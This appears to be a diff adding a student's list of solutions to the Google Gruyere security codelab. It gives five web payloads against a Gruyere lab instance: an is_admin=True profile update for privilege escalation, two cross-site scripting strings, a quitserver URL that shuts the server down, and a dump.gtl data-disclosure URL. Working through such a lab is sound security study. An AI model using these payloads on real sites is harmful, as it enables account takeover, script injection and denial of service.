@@ -1,0 +1,5 @@
+First Exploit = saveprofile?action=update&is_admin=True or https://google-gruyere.appspot.com/401230781103644645480330329584992302572/saveprofile?action=update&is_admin=True
+Second Exploit = <a onmouseover="alert(1)" href="#">read this!</a> 
+Third Exploit = https://google-gruyere.appspot.com/<your-instance-id>/feed.gtl?uid=<script>alert(1)</script>
+Fourth Exploit = quitserver or  https://google-gruyere.appspot.com/401230781103644645480330329584992302572/quitserver
+Fifth Exploit = dump.gtl or https://google-gruyere.appspot.com/401230781103644645480330329584992302572/dump.gtl
